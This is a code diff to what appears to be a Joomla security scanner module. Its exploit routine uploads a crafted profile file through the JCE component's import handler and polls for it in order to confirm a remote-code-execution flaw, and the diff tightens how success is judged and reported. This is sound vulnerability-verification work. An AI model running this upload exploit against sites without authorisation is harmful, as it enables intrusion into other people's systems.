@@ -21,6 +21,11 @@ AFFECTED_JOOMLA_VERSIONS = ["*"]
 AFFECTED_RULE = f"{COMPONENT} < {PATCHED_VERSION}"
 
 
+def _invalid_token_response(body: str) -> bool:
+    lowered = body.lower()
+    return "jinvalid_token" in lowered or "invalid token" in lowered or "token de segurança inválido" in lowered
+
+
 def probe_jce(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict:
     sess = HttpSession(normalize_url(target_url), timeout=timeout, proxy=proxy)
     result = {"found": False, "version": None}
@@ -159,16 +164,33 @@ def run_exploit(
         files={"profile_file": (filename, payload.encode("utf-8"), "application/xml")},
     )
     passive.exploit_ran = True
-    if not upload or upload.get("status") != 200:
+    upload_body = upload.get("body", "") if upload else ""
+    handler_specific = bool(
+        re.search(r"jce|profile.{0,40}(import|upload)|import.{0,40}(success|complete)", upload_body, re.IGNORECASE)
+    )
+    if (
+        not upload
+        or upload.get("status") != 200
+        or upload.get("redirected")
+        or not handler_specific
+    ):
         passive.status = "NOT_CONFIRMED"
         passive.confidence = "MEDIUM"
-        passive.detail += (
-            " Exploit verification reached the upload step but upload did not succeed. "
-            f"CSRF token source: {token_source}; upload status: {upload.get('status') if upload else 0}."
+        passive.detail = (
+            f"JCE {passive.component_version or 'version unknown'} is in the affected range, but the profile-import "
+            "request did not return a JCE-specific acceptance response. No write is claimed and no cleanup filename "
+            f"is reported. CSRF token source: {token_source}; upload status: "
+            f"{upload.get('status') if upload else 0}; redirected={upload.get('redirected') if upload else False}."
         )
+        passive.evidence = {
+            "component_present": True,
+            "token_accepted": not _invalid_token_response(upload_body),
+            "handler_reached": handler_specific,
+            "write_reported": False,
+            "readback_verified": False,
+        }
         return passive
 
-    passive.uploaded_filename = filename
     base_root = sess.base_url or target_url
     candidate_paths = [f"/tmp/{filename}", f"/{filename}"]
     resp, found_path, attempts = poll_paths(
@@ -201,6 +223,7 @@ def run_exploit(
             passive.status = "VULNERABLE_UPLOAD_ONLY"
             passive.confidence = "HIGH"
             passive.proof_url = proof_url
+            passive.uploaded_filename = filename
             passive.detail = (
                 f"A proof file was uploaded (verified in {attempts} attempt(s)), but PHP execution was not confirmed "
                 "(source served or execution blocked). Uploaded proof file must be deleted."
@@ -211,13 +234,11 @@ def run_exploit(
     passive.status = "NOT_CONFIRMED"
     passive.confidence = "MEDIUM"
     passive.detail += (
-        f" Upload appeared to succeed, but the proof file was not reachable after {attempts} attempt(s) in checked locations "
-        f"(/tmp/{filename}, /{filename}). This does not confirm RCE and may mean the file was "
-        f"discarded, renamed, stored elsewhere, or blocked from public access. CSRF token source: {token_source}."
+        f" The handler-specific response was observed, but no proof file was reachable after {attempts} attempt(s) "
+        f"in checked locations (/tmp/{filename}, /{filename}). No write is claimed and no cleanup filename is "
+        f"reported. CSRF token source: {token_source}."
     )
-    passive.action = (
-        f"Upgrade JCE to {PATCHED_VERSION} or later. If {filename} exists anywhere on disk, delete it."
-    )
+    passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later."
     return passive
 
 
@@ -255,7 +276,7 @@ def metadata() -> dict:
         "exploit_available": HAS_EXPLOIT,
         "exploit_modes": EXPLOIT_MODES,
         "intrusive": INTRUSIVE,
-        "module_version": "1.2.0",
+        "module_version": "1.3.0",
         "last_reviewed": "2026-03-20",
         "updated": "2026-03-20",
         "required_detectors": [],
